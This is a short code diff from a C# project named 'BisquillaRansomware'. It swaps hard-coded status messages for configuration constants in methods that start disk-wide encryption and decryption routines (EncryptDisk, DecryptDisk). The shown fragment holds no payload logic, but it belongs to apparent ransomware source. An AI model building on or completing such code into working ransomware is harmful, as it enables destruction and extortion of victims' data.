@@ -117,12 +117,12 @@ namespace BisquillaRansomware
             if ("E".Equals(operation))
             {
                 // Update Status
-                formMain.BeginInvoke(new SimpleStringDelegate(formMain.UpdateStatus), "File Encryption Completed");
+                formMain.BeginInvoke(new SimpleStringDelegate(formMain.UpdateStatus), ConfigurationManager.MESSAGE_FEC);
             }
             else // Decryption
             {
                 // Update Status
-                formMain.BeginInvoke(new SimpleStringDelegate(formMain.UpdateStatus), "File Decryption Completed");
+                formMain.BeginInvoke(new SimpleStringDelegate(formMain.UpdateStatus), ConfigurationManager.MESSAGE_FDC);
             }
 
             // Release Exit Button
@@ -131,14 +131,14 @@ namespace BisquillaRansomware
 
         private static void Enc()
         {
-            formMain.BeginInvoke(new SimpleStringDelegate(formMain.UpdateStatus), "File Encryption in Progress");
+            formMain.BeginInvoke(new SimpleStringDelegate(formMain.UpdateStatus), ConfigurationManager.MESSAGE_FEP);
             EncryptionStrategy es = new EncryptionStrategy();
             es.EncryptDisk();
         }
 
         private static void Dec()
         {
-            formMain.BeginInvoke(new SimpleStringDelegate(formMain.UpdateStatus), "File Decryption in Progress");
+            formMain.BeginInvoke(new SimpleStringDelegate(formMain.UpdateStatus), ConfigurationManager.MESSAGE_FDP);
             DecryptionStrategy ds = new DecryptionStrategy();
             ds.DecryptDisk();
         }
